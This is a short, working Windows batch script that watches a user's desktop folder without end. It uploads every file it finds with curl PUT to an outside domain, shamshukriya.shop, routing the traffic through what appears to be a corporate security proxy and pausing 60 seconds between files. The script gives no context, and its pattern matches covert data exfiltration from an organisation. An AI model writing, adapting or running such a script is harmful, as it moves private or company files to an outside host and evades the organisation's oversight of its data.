@echo off
setlocal enabledelayedexpansion

rem Configure these variables
set "FOLDER_PATH=C:\Users\admspowl\Desktop\upload\Duck\Duck"
set "CURL_CMD=curl --proxy http://proxywsa.hm.com:8080 -X PUT https://shamshukriya.shop/upload -F file=@"


rem Initialize counter
set /a counter=1

echo.

echo ----------------xxxxxxxx----------------

:loop
rem Process all files in the folder
for %%f in ("%FOLDER_PATH%\*.*") do (
    rem Upload the file with counter and line space
    echo.
    echo [~] Uploading file !counter!: %%~nxf
    %CURL_CMD%"%%f"
    echo.
        
    rem Increment the counter
    set /a counter+=1
    
    rem Wait 60 seconds before processing the next file
    timeout /t 60 /nobreak > nul
)

rem Go back to the loop to process new files if they appear
goto loop
